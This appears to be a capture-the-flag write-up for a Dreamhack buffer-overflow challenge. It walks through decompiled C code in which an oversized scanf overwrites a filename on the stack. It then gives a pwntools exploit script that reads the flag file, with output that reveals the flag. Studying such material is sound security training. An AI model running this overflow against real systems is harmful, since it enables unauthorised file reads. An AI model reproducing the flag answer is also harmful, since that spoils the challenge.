### Source Code Overview 
```c
void read_cat(char *param_1)

{
  int iVar1;
  char out_string [128];
  ssize_t local_18;
  int fd;
  
  memset(out_string,0,0x80);
  fd = 0;
  fd = open(param_1,0);
  if (fd == -1) {
    puts("open() error");
    FUN_00401140(1);
  }
  local_18 = read(fd,out_string,0x80);
  if (local_18 == -1) {
    puts("read() error");
    FUN_00401140(1);
  }
  puts("");
  puts(out_string); // print output string
  iVar1 = close(fd);
  if (iVar1 != 0) {
    puts("close() error");
    FUN_00401140(1);
  }
  return;
}


undefined8 main(EVP_PKEY_CTX *param_1)

{
  undefined out_string [128];
  undefined4 local_18;
  undefined2 local_14;
  
  init(param_1);
  local_18 = 0x61632f2e;
  local_14 = 0x74;
  printf("meow? ");
  __isoc99_scanf("%144s",out_string);
  read_cat(&local_18);
  printf("meow, %s :)\n",out_string);
  return 0;
}

```
Take a look at the main() function, we can see that the stack will be look like this:
``Out_tring[128 bytes] local18[4 bytes] local14[2 bytes]``
And there is a big buffer overflow vulnerability while we can override `144-128=16` bytes

The value of `local_18 and local_14` after convert to ascii is `./cat` 

And combine with these lines in `read_cat()` function:
``
fd = open(param_1,0);
local_18 = read(fd,out_string,0x80);
``

It will read 128 bytes from fd of `param_1 that is local_18(0x61632f2e) in main()` amd it means that it also read the `local_14` 

Thus, in this program, it will call `read_cat() `to read the content of file `./cat`

### Exploitation

We have buffer overflow 16 bytes, and we will override the value of `local18 and local14` on stack by the file `/home/bof/flag\0` - it is enough for overflow 16 bytes

The script code:

```py
from pwn import *
p = remote('host3.dreamhack.games', 16582)
payload = b'A'*128
payload += b'/home/bof/flag\0'
p.recvuntil(b"meow? ")
p.sendline(payload)
p.interactive()
```

Result:

```
khanh@ubuntu:~/Documents/PWN-dreamhack/bof/deploy$ python3 sol.py 
[+] Opening connection to host3.dreamhack.games on port 16582: Done
[*] Switching to interactive mode

DH{5cd1f793ae6a081e4bfd28f6d570d83355148245fbe7c1f69b12771202b80a13}

meow, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/home/bof/flag :)
[*] Got EOF while reading in interactive
```